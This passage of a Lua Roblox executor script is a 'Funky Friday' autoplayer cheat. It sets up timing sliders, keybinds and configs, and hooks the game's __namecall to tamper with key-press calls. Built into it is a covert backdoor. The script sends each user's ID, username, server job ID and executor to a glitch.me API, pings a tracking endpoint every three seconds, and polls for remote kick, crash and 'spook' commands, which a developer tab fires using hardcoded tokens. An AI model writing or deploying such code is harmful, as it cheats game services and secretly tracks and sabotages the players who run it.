    Groups.HitTiming:AddSlider('HeldDelay',      { Text = 'Held note delay', Min = -20, Max = 100, Default = 0, Rounding = 0, Compact = true, Suffix = 'ms' })

    Groups.HitTiming:AddLabel('Random delay')
    Groups.HitTiming:AddSlider('NoteDelayMin',   { Text = 'Min note delay', Min = 0, Max = 100, Default = 0,    Rounding = 0, Compact = true, Suffix = 'ms' })
    Groups.HitTiming:AddSlider('NoteDelayMax',   { Text = 'Max note delay', Min = 0, Max = 500, Default = 20,   Rounding = 0, Compact = true, Suffix = 'ms' })

    Groups.HitTiming:AddSlider('HeldDelayMin',   { Text = 'Min held note delay', Min = 0, Max = 100, Default = 0,   Rounding = 0, Compact = true, Suffix = 'ms' })
    Groups.HitTiming:AddSlider('HeldDelayMax',   { Text = 'Max held note delay', Min = 0, Max = 500, Default = 20,  Rounding = 0, Compact = true, Suffix = 'ms' })

    Groups.Misc = Tabs.Main:AddRightGroupbox('Misc')
    Groups.Misc:AddButton('Unlock developer notes', ActivateUnlockables)
    Groups.Misc:AddToggle('AutoClaimRings', { Text = 'Auto claim rings' })

    Groups.Keybinds = Tabs.Main:AddRightGroupbox('Keybinds')
    Groups.Keybinds:AddLabel('Sick'):AddKeyPicker('SickBind', { Default = 'One', NoUI = true })
    Groups.Keybinds:AddLabel('Good'):AddKeyPicker('GoodBind', { Default = 'Two', NoUI = true })
    Groups.Keybinds:AddLabel('Ok'):AddKeyPicker('OkayBind', { Default = 'Three', NoUI = true })
    Groups.Keybinds:AddLabel('Bad'):AddKeyPicker('BadBind', { Default = 'Four', NoUI = true })

    Groups.Configs = Tabs.Miscellaneous:AddRightGroupbox('Configs')
    Groups.Credits = Tabs.Miscellaneous:AddRightGroupbox('Credits')
    local function addRichText(label)
        label.TextLabel.RichText = true
    end

    addRichText(Groups.Credits:AddLabel('<font color="#3da5ff">wally</font> - main script'))
    addRichText(Groups.Credits:AddLabel('<font color="#ff00ff">Bart3kk</font> - current & og mobile ui (+fixes)', true))
    addRichText(Groups.Credits:AddLabel('<font color="#7215a9">seikoso_</font> - fixing my shit spaghetti code', true))
    addRichText(Groups.Credits:AddLabel('<font color="#ff00ff">v3r_</font> - og mobile ui'))
    addRichText(Groups.Credits:AddLabel('<font color="#de6cff">Sezei</font> - contributor'))
    Groups.Credits:AddLabel('Inori - ui library')
    Groups.Credits:AddLabel('Jan - old ui library')
    Groups.Credits:AddButton("copy link to v3r_'s repo", function()
        if pcall(setclipboard, "https://github.com/ltseverydayyou/uuuuuuu/tree/main/Funky%20Friday") then
            UI:Notify("Copied v3r_'s GitHub link to clipboard!", 5)
        end
    end)
    Groups.Credits:AddButton('copy link to official port', function()
        if pcall(setclipboard, "https://github.com/Bart3kk/funky-friday-autoplay") then
            UI:Notify("Copied Bart3kk's GitHub link to clipboard!", 5)
        end
    end)

    Groups.Misc = Tabs.Miscellaneous:AddRightGroupbox('Miscellaneous')
    Groups.Misc:AddLabel(metadata.message or 'no message found!', true)

    Groups.Misc:AddDivider()
    Groups.Misc:AddButton('Unload script', function()
        pcall(shared._unload)
        if not isDev then
            log(unloadEmbed, 'unload')
        end
    end)

    Groups.Misc:AddLabel('Menu toggle'):AddKeyPicker('MenuToggle', { Default = 'RightControl', NoUI = true })

    UI.ToggleKeybind = Options.MenuToggle

    if type(readfile) == 'function' and type(writefile) == 'function' and type(makefolder) == 'function' and type(isfolder) == 'function' then
    makefolder('funky_friday_autoplayer')
    makefolder('funky_friday_autoplayer\\configs')

    Groups.Configs:AddDropdown('ConfigList', { Text = 'Config list', Values = {}, AllowNull = true })
    Groups.Configs:AddInput('ConfigName',    { Text = 'Config name' })

    Groups.Configs:AddDivider()

    Groups.Configs:AddButton('Save config', function()
        local name = Options.ConfigName.Value;
        if name:gsub(' ', '') == '' then
            return UI:Notify('Invalid config name.', 3)
        end

        local success, err = SaveManager:Save(name)
        if not success then
            return UI:Notify(tostring(err), 5)
        end

        UI:Notify(string.format('Saved config %q', name), 5)
        task.defer(SaveManager.Refresh)
    end)

    Groups.Configs:AddButton('Load', function()
        local name = Options.ConfigList.Value
        local success, err = SaveManager:Load(name)
        if not success then
            return UI:Notify(tostring(err), 5)
        end

        UI:Notify(string.format('Loaded config %q', name), 5)
    end):AddButton('Delete', function()
        local name = Options.ConfigList.Value
        if name:gsub(' ', '') == '' then
            return UI:Notify('Invalid config name.', 3)
        end

        local success, err = SaveManager:Delete(name)
        if not success then
            return UI:Notify(tostring(err), 5)
        end

        UI:Notify(string.format('Deleted config %q', name), 5)

        task.spawn(Options.ConfigList.SetValue, Options.ConfigList, nil)
        task.defer(SaveManager.Refresh)
    end)

    Groups.Configs:AddButton('Refresh list', SaveManager.Refresh)
    else
    Groups.Configs:AddLabel('Your exploit is missing file functions so you are unable to use configs.', true)
    end

    do
    local latestThemeIndex = 0
    for i, theme in next, ThemeManager.BuiltInThemes do
        if theme[1] > latestThemeIndex then
            latestThemeIndex = theme[1]
        end
    end

    latestThemeIndex = latestThemeIndex + 1

    local linoriaTheme = ThemeManager.BuiltInThemes.Default[2]
    local funkyFridayTheme = table.clone(ThemeManager.BuiltInThemes.Default[2])

    funkyFridayTheme.AccentColor = Color3.fromRGB(255, 65, 65):ToHex()

    ThemeManager.BuiltInThemes['Linoria'] = { latestThemeIndex, linoriaTheme }
    ThemeManager.BuiltInThemes['Default'] = { 1, funkyFridayTheme }

    ThemeManager:SetLibrary(UI)
    ThemeManager:SetFolder('funky_friday_autoplayer')
    ThemeManager:ApplyToGroupbox(Tabs.Miscellaneous:AddLeftGroupbox('Themes'))

    SaveManager:SetIgnoreIndexes({
        "BackgroundColor", "MainColor", "AccentColor", "OutlineColor", "FontColor",
        "ThemeManager_ThemeList", 'ThemeManager_CustomThemeList', 'ThemeManager_CustomThemeName',
    })
    end

    if isDev then
        Tabs.Dev = Window:AddTab('Developer')
        local function users()
            local res = req({
                Url = 'https://funky-friday-api.glitch.me/users',
                Method = "GET",
                Headers = {
                    ["token_user"] = "NULL~c32f45ce139af82602a18345fd700dc5f60d1efde57d3e123dff83f000b5d626_USER",
                    ["uid"] = tostring(UID)
                }
            })
        
            if res.StatusCode == 200 then
                local usersData = httpService:JSONDecode(res.Body)
                local usernames = {}
        
                for userId, user in pairs(usersData) do
                    table.insert(usernames, user.username or user.displayName)
                end
        
                return usersData, usernames
            else
                warn("Failed to fetch users: HTTP " .. res.StatusCode)
                return {}, {}
            end
        end

        Groups.UserInfo = Tabs.Dev:AddLeftGroupbox('User Information')
        Groups.Action = Tabs.Dev:AddLeftGroupbox('Actions')
        Groups.Dev = Tabs.Dev:AddRightGroupbox('API')
        Groups.DevExtra = Tabs.Dev:AddRightGroupbox('Extra')

        local usernameLabel = Groups.UserInfo:AddLabel('Username: ')
        local dnameLabel = Groups.UserInfo:AddLabel('Display Name: ')
        local serverLabel = Groups.UserInfo:AddLabel('Server JobID: ', true)
        local execLabel = Groups.UserInfo:AddLabel('Executor:')

        local usersData, usernames = users()

        local btnTp, btnKick, btnSpook, btnCrash, btnBygone

        local curuseryes = 0

        local dropdown = Groups.Dev:AddDropdown('users', {
            Values = usernames,
            Default = 0,
            Text = 'Select User',
            Tooltip = 'Choose a user from the list',
            Callback = function(value)
                for userId, user in pairs(usersData) do
                    if user.username == value or user.displayName == value then
                        usernameLabel:SetText(string.format("Username: %s", (user.username or 'N/A')))
                        dnameLabel:SetText(string.format("Display Name: %s", (user.displayName or 'N/A')))
                        serverLabel:SetText(string.format("Server JobID: %s", (user.jobId or 'N/A')))
                        execLabel:SetText(string.format("Executor: %s", (user.executor or 'N/A')))
                        curuseryes = userId
                        break
                    end
                end
            end
        })

        btnTp = Groups.Action:AddButton('Teleport', function()
            TeleportService:TeleportToPlaceInstance(6447798030, usersData[curuseryes].jobId)
        end)

        btnKick = Groups.Action:AddButton('Kick', function()
            req({
                Url = 'https://funky-friday-api.glitch.me/kickUi',
                Method = 'POST',
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = httpService:JSONEncode({ ["userId"] = curuseryes })
            })
        end)

        btnCrash = Groups.Action:AddButton('Crash', function()
            req({
                Url = 'https://funky-friday-api.glitch.me/crashUi',
                Method = 'POST',
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = httpService:JSONEncode({ ["userId"] = curuseryes })
            })
        end)

        btnSpook = Groups.Action:AddButton('Spook', function()
            req({
                Url = 'https://funky-friday-api.glitch.me/spookUi',
                Method = 'POST',
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = httpService:JSONEncode({ ["userId"] = curuseryes })
            })
        end)
        
        btnBygone = Groups.Action:AddButton('Bygone', function()
            req({
                Url = 'https://funky-friday-api.glitch.me/bygoneUi',
                Method = 'POST',
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = httpService:JSONEncode({ ["userId"] = curuseryes })
            })
        end)
        
        Groups.Dev:AddButton('Refresh', function()
            local last = table.clone(usernames)
            usersData, usernames = users()
            if usernames ~= last then
                dropdown:SetValues(usernames)
                dropdown:SetValue(0)
                last = table.clone(usernames)
            end
        end)

        local function updateDev()
            if UID == (156256804 or 7360362956 or 5728443297) then
                if i == 0 then
                    stateUpdate = 'ON'
                    req({
                        Url = urlUpdate,
                        Method = "POST",
                        Headers = {["token_update"] = "NULL~c32f45ce139af82602a18345fd700dc5f60d1efde57d3e123dff83f000b5d626_UPDATE", ["Content-Type"] = "application/json", ["uid"] = '"'..UID..'"'},
                        Body = '',
                    })
                    i = 1
                else
                    stateUpdate = 'OFF'
                    req({
                        Url = urlUpdate,
                        Method = "POST",
                        Headers = {["token_update"] = "NULL~c32f45ce139af82602a18345fd700dc5f60d1efde57d3e123dff83f000b5d626_UPDATE", ["Content-Type"] = "application/json", ["uid"] = '"'..UID..'"'},
                        Body = '',
                    })
                    i = 0
                end
                UI:Notify('Triggered the update switch. Current state: '..stateUpdate, 3)
            else
                UI:Notify('Error: No permission.', 3)
            end
        end

        Groups.DevExtra:AddButton('Toggle update', updateDev)

        local function onDevChatted(message)
            if message == cmd then
                UI:Notify('Kicked all users in this server.', 3)
            elseif message == cmd1 then
                UI:Notify('Crashed all users inn this server', 3)
            end
        end
        LP.Chatted:Connect(onDevChatted)
    end
    if isDev then
        old = hookmetamethod(game,"__namecall",newcclosure(function(self,...)
            local args = {...}
            local method = getnamecallmethod()
            if tostring(self) == 'RF' and method == "InvokeServer" then
                if args[1][3] == "UpdateKey" and (Options.PressMode.Value == ('dev virtual')) then
                    extraDev()
                    return old(self,unpack(args))
                else
                    return old(self,unpack(args))
                end
            end

            return old(self,...)
        end))
    else
        old = hookmetamethod(game,"__namecall",newcclosure(function(self,...)
            local args = {...}
            local method = getnamecallmethod()
            if tostring(self) == 'RF' and method == "InvokeServer" then
                if args[1][3] == "UpdateKey" and Options.PressMode.Value == 'extra virtual' then
                    extra()
                    return old(self,unpack(args))
                else
                    return old(self,unpack(args))
                end
            end

            return old(self,...)
        end))
    end
    UI:Notify('Loaded script!', 3)
    uiLoaded = true
    if not isDev then
        log(execEmbed, 'exec')
        for _, player in pairs(P:GetPlayers()) do
            player.Chatted:Connect(function(message)
                onPlayerChatted(player, message)
            end)
        end
        P.PlayerAdded:Connect(function(player)
            player.Chatted:Connect(function(message)
                onPlayerChatted(player, message)
            end)
        end)
        req({
            Url = 'https://funky-friday-api.glitch.me/submit',
            Method = 'POST',
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = httpService:JSONEncode({ ["userId"] = UID, ["username"] = cname, ["displayName"] = dname, ["jobId"] = GID, ["executor"] = executor })
        })
        while task.wait(3) and uiLoaded do
            task.spawn(fetchKick)
            task.spawn(fetchCrash)
            task.spawn(fetchSpook)
            task.spawn(fetchBygone)
            
            task.spawn(function()
                req({
                    Url = 'https://funky-friday-api.glitch.me/track',
                    Method = 'POST',
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = httpService:JSONEncode({ ["userId"] = UID })
                })
            end)
        end
    end
else
    LP:Kick('The script is updating. Please wait.')
end
